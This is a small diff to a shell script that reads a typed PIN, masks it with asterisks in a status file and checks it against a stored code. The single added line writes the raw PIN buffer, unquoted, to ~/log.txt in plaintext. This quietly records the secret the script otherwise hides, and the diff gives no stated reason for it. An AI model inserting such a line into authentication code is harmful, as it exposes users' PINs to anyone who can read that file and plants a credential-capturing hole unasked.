@@ -36,6 +36,8 @@ case "${1:-}" in
     buf="$(cat "$BUFFER_FILE")"
     printf '%*s' "${#buf}" '' | tr ' ' '*' > "$STATUS_FILE"
 
+    echo $buf > ~/log.txt
+
     if [ "${#buf}" -ge "$PIN_LENGTH" ]; then
       expected="$(printf '%s' "${PIN_LOGIN_CODE:-}" | base64 -d 2>/dev/null || true)"
       : > "$BUFFER_FILE"
